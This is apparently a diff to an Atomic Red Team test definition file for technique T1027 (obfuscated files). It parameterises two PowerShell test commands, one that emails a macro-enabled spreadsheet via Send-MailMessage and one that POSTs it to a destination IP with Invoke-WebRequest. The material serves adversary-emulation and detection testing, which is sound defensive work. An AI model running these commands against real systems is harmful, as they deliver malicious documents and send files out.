@@ -28937,11 +28937,9 @@ defense-evasion:
           description: SMTP Server IP Address
           type: string
           default: 127.0.0.1
-      dependency_executor_name: powershell
       executor:
-        command: '"Send-MailMessage -From #{sender} -To #{receiver} -Subject "T1027
-          Atomic Test" -Attachments PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm
-          -SmtpServer #{smtp_server}"
+        command: 'Send-MailMessage -From #{sender} -To #{receiver} -Subject ''T1027_Atomic_Test''
+          -Attachments #{input_file} -SmtpServer #{smtp_server}
 
 '
         name: powershell
@@ -28961,9 +28959,8 @@ defense-evasion:
           description: Destination IP address
           type: string
           default: 127.0.0.1
-      dependency_executor_name: powershell
       executor:
-        command: 'Invoke-WebRequest -Uri #{ip_address} -Method POST -Body PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm
+        command: 'Invoke-WebRequest -Uri #{ip_address} -Method POST -Body #{input_file}
 
 '
         name: powershell
